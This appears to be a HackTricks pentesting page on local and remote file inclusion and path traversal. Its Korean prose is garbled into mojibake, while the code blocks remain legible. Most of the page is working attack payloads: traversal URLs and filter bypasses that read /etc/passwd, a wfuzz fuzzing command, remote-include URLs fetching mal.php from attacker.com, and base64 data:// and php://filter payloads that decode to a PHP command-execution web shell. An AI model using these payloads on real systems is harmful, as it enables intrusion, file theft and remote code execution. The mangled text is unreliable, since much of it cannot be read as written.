# íŒŒì¼ í¬í•¨/ê²½ë¡œ ì´íƒˆ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ ë§ì€ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ë ¤ë©´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°**\
í•´í‚¹ì˜ ì¦ê±°ì›€ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ ìœ ì§€í•˜ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ì˜¤ëŠ˜ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## íŒŒì¼ í¬í•¨

**ì›ê²© íŒŒì¼ í¬í•¨ (RFI):** íŒŒì¼ì´ ì›ê²© ì„œë²„ì—ì„œ ë¡œë“œë¨ (ìµœìƒ: ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  ì„œë²„ê°€ ì‹¤í–‰í•¨). PHPì—ì„œëŠ” ì´ ê¸°ëŠ¥ì´ **ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”**ë¨ (**allow\_url\_include**).\
**ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI):** ì„œë²„ê°€ ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•¨.

ì‚¬ìš©ìê°€ ì„œë²„ê°€ ë¡œë“œí•  íŒŒì¼ì„ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œë“  ì œì–´í•  ìˆ˜ ìˆëŠ” ê²½ìš° ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.

ì·¨ì•½í•œ **PHP í•¨ìˆ˜**: require, require\_once, include, include\_once

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” í¥ë¯¸ë¡œìš´ ë„êµ¬: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - í¥ë¯¸ë¡œìš´ - LFI2RCE íŒŒì¼
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**ì—¬ëŸ¬ \*nix LFI ëª©ë¡ì„ ì„ì–´ ë” ë§ì€ ê²½ë¡œë¥¼ ì¶”ê°€í•˜ì—¬ ë‹¤ìŒì„ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/`ë¥¼ `\`ë¡œ ë³€ê²½í•´ë³´ì„¸ìš”\
`../../../../../`ë¥¼ ì¶”ê°€í•´ë³´ì„¸ìš”

ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ /etc/password íŒŒì¼ì„ ì°¾ëŠ” ì—¬ëŸ¬ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Windows**

ë‹¤ì–‘í•œ ì›Œë“œë¦¬ìŠ¤íŠ¸ë¥¼ ë³‘í•©:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/`ë¥¼ `\`ë¡œ ë³€ê²½í•´ë³´ì„¸ìš”\
`C:/`ë¥¼ ì œê±°í•˜ê³  `../../../../../`ë¥¼ ì¶”ê°€í•´ë³´ì„¸ìš”

ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ /boot.ini íŒŒì¼ì„ ì°¾ëŠ” ì—¬ëŸ¬ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **OS X**

Linuxì˜ LFI ëª©ë¡ì„ í™•ì¸í•˜ì„¸ìš”.

## Basic LFI and bypasses

ëª¨ë“  ì˜ˆì œëŠ” ë¡œì»¬ íŒŒì¼ í¬í•¨ì„ ìœ„í•œ ê²ƒì´ì§€ë§Œ ì›ê²© íŒŒì¼ í¬í•¨ì—ë„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### ë¹„ì¬ê·€ì ìœ¼ë¡œ ì œê±°ëœ íƒìƒ‰ ì‹œí€€ìŠ¤
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ë„ ë°”ì´íŠ¸ (%00)**

ì œê³µëœ ë¬¸ìì—´ ëì— ë” ë§ì€ ë¬¸ìë¥¼ ì¶”ê°€í•˜ì—¬ ìš°íšŒí•©ë‹ˆë‹¤ (ìš°íšŒ ë°©ë²•: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
ì´ ë¬¸ì œëŠ” **PHP 5.4ë¶€í„° í•´ê²°ë˜ì—ˆìŠµë‹ˆë‹¤**

### **ì¸ì½”ë”©**

ì´ì¤‘ URL ì¸ì½”ë”©(ë° ê¸°íƒ€ ë°©ë²•)ê³¼ ê°™ì€ ë¹„í‘œì¤€ ì¸ì½”ë”©ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### ê¸°ì¡´ í´ë”ì—ì„œ

ì–´ì©Œë©´ ë°±ì—”ë“œê°€ í´ë” ê²½ë¡œë¥¼ í™•ì¸í•˜ê³  ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### ì„œë²„ì˜ íŒŒì¼ ì‹œìŠ¤í…œ ë””ë ‰í† ë¦¬ íƒìƒ‰

ì„œë²„ì˜ íŒŒì¼ ì‹œìŠ¤í…œì€ íŠ¹ì • ê¸°ìˆ ì„ í™œìš©í•˜ì—¬ íŒŒì¼ë¿ë§Œ ì•„ë‹ˆë¼ ë””ë ‰í† ë¦¬ë„ ì¬ê·€ì ìœ¼ë¡œ íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì€ ë””ë ‰í† ë¦¬ì˜ ê¹Šì´ë¥¼ í™•ì¸í•˜ê³  íŠ¹ì • í´ë”ì˜ ì¡´ì¬ ì—¬ë¶€ë¥¼ ì¡°ì‚¬í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì•„ë˜ì—ëŠ” ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•œ ìì„¸í•œ ë°©ë²•ì´ ë‚˜ì™€ ìˆìŠµë‹ˆë‹¤:

1. **ë””ë ‰í† ë¦¬ ê¹Šì´ í™•ì¸:** í˜„ì¬ ë””ë ‰í† ë¦¬ì˜ ê¹Šì´ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ `/etc/passwd` íŒŒì¼ì„ ì„±ê³µì ìœ¼ë¡œ ê°€ì ¸ì˜¤ëŠ” ê²ƒìœ¼ë¡œ í˜„ì¬ ë””ë ‰í† ë¦¬ì˜ ê¹Šì´ë¥¼ í™•ì¸í•©ë‹ˆë‹¤ (ì„œë²„ê°€ Linux ê¸°ë°˜ì¸ ê²½ìš° í•´ë‹¹). ê¹Šì´ê°€ ì„¸ ê°œì¸ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±ëœ ì˜ˆì‹œ URLì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **í´ë” ì¡°ì‚¬:** ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í´ë” ì´ë¦„(ì˜ˆ: `private`)ì„ URLì— ì¶”ê°€í•œ ë‹¤ìŒ `/etc/passwd`ë¡œ ì´ë™í•©ë‹ˆë‹¤. ì¶”ê°€ëœ ë””ë ‰í† ë¦¬ ìˆ˜ì¤€ì€ ê¹Šì´ë¥¼ í•˜ë‚˜ ì¦ê°€í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **ê²°ê³¼ í•´ì„:** ì„œë²„ì˜ ì‘ë‹µì€ í´ë”ì˜ ì¡´ì¬ ì—¬ë¶€ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:
   * **ì—ëŸ¬ / ì¶œë ¥ ì—†ìŒ:** `private` í´ë”ê°€ ì§€ì •ëœ ìœ„ì¹˜ì— ì¡´ì¬í•˜ì§€ ì•Šì„ ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.
   * **`/etc/passwd`ì˜ ë‚´ìš©:** `private` í´ë”ì˜ ì¡´ì¬ê°€ í™•ì¸ë©ë‹ˆë‹¤.
4. **ì¬ê·€ì  íƒìƒ‰:** ë°œê²¬ëœ í´ë”ëŠ” ë™ì¼í•œ ê¸°ìˆ  ë˜ëŠ” ì „í†µì ì¸ ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI) ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ í•˜ìœ„ ë””ë ‰í† ë¦¬ë‚˜ íŒŒì¼ì„ ë” íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

íŒŒì¼ ì‹œìŠ¤í…œì˜ ë‹¤ë¥¸ ìœ„ì¹˜ì— ìˆëŠ” ë””ë ‰í† ë¦¬ë¥¼ íƒìƒ‰í•˜ë ¤ë©´ í˜ì´ë¡œë“œë¥¼ ì¡°ì •í•˜ì‹­ì‹œì˜¤. ì˜ˆë¥¼ ë“¤ì–´, `/var/www/`ì— `private` ë””ë ‰í† ë¦¬ê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ (í˜„ì¬ ë””ë ‰í† ë¦¬ê°€ ê¹Šì´ 3ì— ìˆëŠ” ê²ƒìœ¼ë¡œ ê°€ì •), ë‹¤ìŒì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **ê²½ë¡œ ì ˆë‹¨ ê¸°ìˆ **

ê²½ë¡œ ì ˆë‹¨ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ íŒŒì¼ ê²½ë¡œë¥¼ ì¡°ì‘í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì¢…ì¢… íŠ¹ì • ë³´ì•ˆ ì¡°ì¹˜ê°€ íŒŒì¼ ê²½ë¡œ ëì— ì¶”ê°€ ë¬¸ìë¥¼ ì¶”ê°€í•˜ì—¬ ìš°íšŒí•¨ìœ¼ë¡œì¨ ì œí•œëœ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ëª©í‘œëŠ” ë³´ì•ˆ ì¡°ì¹˜ì— ì˜í•´ ë³€ê²½ëœ íŒŒì¼ ê²½ë¡œê°€ ì—¬ì „íˆ ì›í•˜ëŠ” íŒŒì¼ì„ ê°€ë¦¬í‚¤ë„ë¡ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤.

PHPì—ì„œ íŒŒì¼ ê²½ë¡œì˜ ë‹¤ì–‘í•œ í‘œí˜„ì€ íŒŒì¼ ì‹œìŠ¤í…œì˜ ì„±ê²©ìœ¼ë¡œ ì¸í•´ ë™ë“±í•˜ê²Œ ê°„ì£¼ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, `/etc/passwd/`ëŠ” ëª¨ë‘ ë™ì¼í•œ ê²½ë¡œë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤.
* ë§ˆì§€ë§‰ 6ìê°€ `passwd`ì¸ ê²½ìš° `/`ë¥¼ ì¶”ê°€í•˜ì—¬ `passwd/`ë¡œ ë§Œë“¤ì–´ë„ ëŒ€ìƒ íŒŒì¼ì´ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* ë§ˆì°¬ê°€ì§€ë¡œ íŒŒì¼ ê²½ë¡œì— `.php`ê°€ ì¶”ê°€ëœ ê²½ìš° (`shellcode.php`ì™€ ê°™ì´), ëì— `/.`ë¥¼ ì¶”ê°€í•´ë„ ì•¡ì„¸ìŠ¤ë˜ëŠ” íŒŒì¼ì´ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ì œê³µëœ ì˜ˆì œëŠ” ê²½ë¡œ ì ˆë‹¨ì„ í™œìš©í•˜ì—¬ ë¯¼ê°í•œ ì½˜í…ì¸ ì¸ `/etc/passwd`ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ í•„ìš”í•œ íƒìƒ‰ íšŸìˆ˜ëŠ” ëŒ€ëµ 2027íšŒ ì •ë„ì¼ ìˆ˜ ìˆì§€ë§Œ, ì´ ìˆ«ìëŠ” ì„œë²„ì˜ êµ¬ì„±ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **ë‹· ì„¸ê·¸ë¨¼íŠ¸ ë° ì¶”ê°€ ë¬¸ì ì‚¬ìš©**: íƒìƒ‰ ì‹œí€€ìŠ¤(`../`)ëŠ” ì¶”ê°€ ë‹· ì„¸ê·¸ë¨¼íŠ¸ì™€ ë¬¸ìì™€ ê²°í•©ë˜ì–´ íŒŒì¼ ì‹œìŠ¤í…œì„ íƒìƒ‰í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì„œë²„ì— ì˜í•´ ì¶”ê°€ëœ ë¬¸ìì—´ì„ ë¬´ì‹œí•˜ê³  íš¨ê³¼ì ìœ¼ë¡œ íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **í•„ìš”í•œ íƒìƒ‰ íšŸìˆ˜ ê²°ì •**: ì‹œí–‰ì°©ì˜¤ë¥¼ í†µí•´ `../` ì‹œí€€ìŠ¤ì˜ ì •í™•í•œ íšŸìˆ˜ë¥¼ ì°¾ì•„ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ë¡œ ì´ë™í•œ ë‹¤ìŒ `/etc/passwd`ë¡œ ì´ë™í•˜ì—¬ ì¶”ê°€ëœ ë¬¸ìì—´(ì˜ˆ: `.php`)ì´ ì¤‘í™”ë˜ì§€ë§Œ ì›í•˜ëŠ” ê²½ë¡œ(`/etc/passwd`)ê°€ ìœ ì§€ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ê°€ì§œ ë””ë ‰í† ë¦¬ë¡œ ì‹œì‘í•˜ê¸°**: ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë””ë ‰í† ë¦¬(ì˜ˆ: `a/`)ë¡œ ê²½ë¡œë¥¼ ì‹œì‘í•˜ëŠ” ê²ƒì€ ì˜ˆë°© ì¡°ì¹˜ë¡œ ì‚¬ìš©ë˜ê±°ë‚˜ ì„œë²„ì˜ ê²½ë¡œ êµ¬ë¬¸ ë¶„ì„ ë…¼ë¦¬ ìš”êµ¬ ì‚¬í•­ì„ ì¶©ì¡±ì‹œí‚¤ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì…ë‹ˆë‹¤.

ê²½ë¡œ ì ˆì‚­ ê¸°ìˆ ì„ ì‚¬ìš©í•  ë•ŒëŠ” ì„œë²„ì˜ ê²½ë¡œ êµ¬ë¬¸ ë¶„ì„ ë™ì‘ê³¼ íŒŒì¼ ì‹œìŠ¤í…œ êµ¬ì¡°ë¥¼ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ê° ì‹œë‚˜ë¦¬ì˜¤ë§ˆë‹¤ ë‹¤ë¥¸ ì ‘ê·¼ ë°©ì‹ì´ í•„ìš”í•  ìˆ˜ ìˆìœ¼ë©°, ê°€ì¥ íš¨ê³¼ì ì¸ ë°©ë²•ì„ ì°¾ê¸° ìœ„í•´ í…ŒìŠ¤íŠ¸ê°€ ì¢…ì¢… í•„ìš”í•©ë‹ˆë‹¤.

**ì´ ì·¨ì•½ì ì€ PHP 5.3ì—ì„œ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.**

### **í•„í„° ìš°íšŒ íŠ¸ë¦­**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## ì›ê²© íŒŒì¼ í¬í•¨

PHPì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **`allow_url_include`**ê°€ **Off**ë¡œ ì„¤ì •ë˜ì–´ ìˆì–´ ë¹„í™œì„±í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì‘ë™í•˜ë ¤ë©´ **On**ìœ¼ë¡œ ì„¤ì •í•´ì•¼í•˜ë©°, ê·¸ ê²½ìš°ì—ëŠ” ì„œë²„ì—ì„œ PHP íŒŒì¼ì„ í¬í•¨ì‹œì¼œ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
ë§Œì•½ ì–´ë–¤ ì´ìœ ë¡œë“  **`allow_url_include`**ê°€ **On**ì´ì§€ë§Œ PHPê°€ ì™¸ë¶€ ì›¹í˜ì´ì§€ ì ‘ê·¼ì„ **í•„í„°ë§**í•˜ëŠ” ê²½ìš°, [ì´ ê²Œì‹œë¬¼ì— ë”°ë¥´ë©´](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), base64ë¥¼ ì‚¬ìš©í•˜ì—¬ b64 PHP ì½”ë“œë¥¼ ë””ì½”ë”©í•˜ê³  RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
ì´ì „ ì½”ë“œì—ì„œ ìµœì¢… `+.txt`ê°€ ì¶”ê°€ëœ ì´ìœ ëŠ” ê³µê²©ìê°€ `.txt`ë¡œ ëë‚˜ëŠ” ë¬¸ìì—´ì´ í•„ìš”í–ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ë¬¸ìì—´ì´ `.txt`ë¡œ ëë‚˜ê³  b64 ë””ì½”ë”© í›„ì— í•´ë‹¹ ë¶€ë¶„ì€ ê·¸ëƒ¥ ì“°ë ˆê¸°ê°€ ë˜ê³  ì‹¤ì œ PHP ì½”ë“œê°€ í¬í•¨ë˜ì–´ (ë”°ë¼ì„œ ì‹¤í–‰ë¨) ë°˜í™˜ë©ë‹ˆë‹¤.
{% endhint %}

ë‹¤ë¥¸ ì˜ˆëŠ” **`php://` í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°**ì…ë‹ˆë‹¤:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python ë£¨íŠ¸ ìš”ì†Œ

íŒŒì´ì¬ì—ì„œ ì´ì™€ ê°™ì€ ì½”ë“œë¥¼ ì‚¬ìš©í•  ë•Œ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ì‚¬ìš©ìê°€ `file_name`ì— **ì ˆëŒ€ ê²½ë¡œ**ë¥¼ ì „ë‹¬í•˜ë©´ **ì´ì „ ê²½ë¡œê°€ ê·¸ëŒ€ë¡œ ì œê±°**ë©ë‹ˆë‹¤:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
ë‹¤ìŒì€ [ë¬¸ì„œ](https://docs.python.org/3.10/library/os.path.html#os.path.join)ì— ë”°ë¥¸ ì˜ë„ëœ ë™ì‘ì…ë‹ˆë‹¤:

> êµ¬ì„± ìš”ì†Œê°€ ì ˆëŒ€ ê²½ë¡œì¸ ê²½ìš°, ì´ì „ ëª¨ë“  êµ¬ì„± ìš”ì†Œê°€ ì‚­ì œë˜ê³  ì ˆëŒ€ ê²½ë¡œ êµ¬ì„± ìš”ì†Œë¶€í„° ì—°ê²°ì´ ê³„ì†ë©ë‹ˆë‹¤.

## Java ë””ë ‰í† ë¦¬ ëª©ë¡

Javaì—ì„œ Path Traversalì´ ìˆëŠ” ê²½ìš° **íŒŒì¼ ëŒ€ì‹  ë””ë ‰í† ë¦¬ë¥¼ ìš”ì²­**í•˜ë©´ **í•´ë‹¹ ë””ë ‰í† ë¦¬ì˜ ëª©ë¡ì´ ë°˜í™˜**ë©ë‹ˆë‹¤. ë‹¤ë¥¸ ì–¸ì–´ì—ì„œëŠ” ì´ëŸ¬í•œ ì¼ì´ ë°œìƒí•˜ì§€ ì•Šì„ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤ (afaik).

## ìƒìœ„ 25ê°œ ë§¤ê°œë³€ìˆ˜

ë‹¤ìŒì€ ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI) ì·¨ì•½ì ì— ì·¨ì•½í•  ìˆ˜ ìˆëŠ” ìƒìœ„ 25ê°œ ë§¤ê°œë³€ìˆ˜ ëª©ë¡ì…ë‹ˆë‹¤ ([ë§í¬](https://twitter.com/trbughunters/status/1279768631845494787) ì°¸ì¡°):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP ë˜í¼ ë° í”„ë¡œí† ì½œì„ ì‚¬ìš©í•œ LFI / RFI

### php://filter

PHP í•„í„°ë¥¼ ì‚¬ìš©í•˜ë©´ ë°ì´í„°ë¥¼ ì½ê±°ë‚˜ ì“°ê¸° ì „ì— ê¸°ë³¸ **ìˆ˜ì • ì‘ì—…**ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„í„°ì—ëŠ” 5ê°€ì§€ ì¹´í…Œê³ ë¦¬ê°€ ìˆìŠµë‹ˆë‹¤:

* [ë¬¸ìì—´ í•„í„°](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: ë°ì´í„°ì—ì„œ íƒœê·¸ë¥¼ ì œê±°í•©ë‹ˆë‹¤ ("<"ì™€ ">" ë¬¸ì ì‚¬ì´ì˜ ëª¨ë“  ê²ƒ)
* ì´ í•„í„°ëŠ” í˜„ëŒ€ ë²„ì „ì˜ PHPì—ì„œ ì‚¬ë¼ì¡ŒìŒì„ ìœ ì˜í•˜ì‹­ì‹œì˜¤.
* [ë³€í™˜ í•„í„°](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : ë‹¤ë¥¸ ì¸ì½”ë”©ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤(`convert.iconv.<input_enc>.<output_enc>`). ì§€ì›ë˜ëŠ” **ëª¨ë“  ì¸ì½”ë”© ëª©ë¡**ì„ ì–»ìœ¼ë ¤ë©´ ì½˜ì†”ì—ì„œ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` ë³€í™˜ í•„í„°ë¥¼ ë‚¨ìš©í•˜ë©´ **ì„ì˜ì˜ í…ìŠ¤íŠ¸ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìœ¼ë©°, ì„ì˜ì˜ í…ìŠ¤íŠ¸ë¥¼ ì‘ì„±í•˜ê±°ë‚˜ í•¨ìˆ˜ë¥¼ ë§Œë“¤ì–´ ì„ì˜ì˜ í…ìŠ¤íŠ¸ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ì •ë³´ëŠ” [**php í•„í„°ë¥¼ í†µí•œ LFI2RCE**](lfi2rce-via-php-filters.md)ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.
{% endhint %}

* [ì••ì¶• í•„í„°](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: ë‚´ìš©ì„ ì••ì¶•í•©ë‹ˆë‹¤ (ë§ì€ ì •ë³´ë¥¼ ì™¸ë¶€ë¡œ ìœ ì¶œí•˜ëŠ” ê²½ìš° ìœ ìš©)
* `zlib.inflate`: ë°ì´í„°ë¥¼ ì••ì¶• í•´ì œí•©ë‹ˆë‹¤
* [ì•”í˜¸í™” í•„í„°](https://www.php.net/manual/en/filters.encryption.php)
